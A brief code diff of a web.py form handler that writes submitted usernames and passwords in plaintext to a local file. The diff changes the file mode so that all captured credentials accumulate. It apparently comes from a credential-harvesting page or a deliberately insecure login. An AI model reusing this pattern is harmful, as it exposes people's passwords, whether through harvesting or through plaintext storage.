@@ -14,7 +14,7 @@ class index:
 
    def POST(self):
       form = web.input(username="", password="")
-      f = open('passwords.txt', 'w')
+      f = open('passwords.txt', 'a')
       f.write("Username: " + form.username)
       f.write(" Password: " + form.password + "\n")
       print(form)
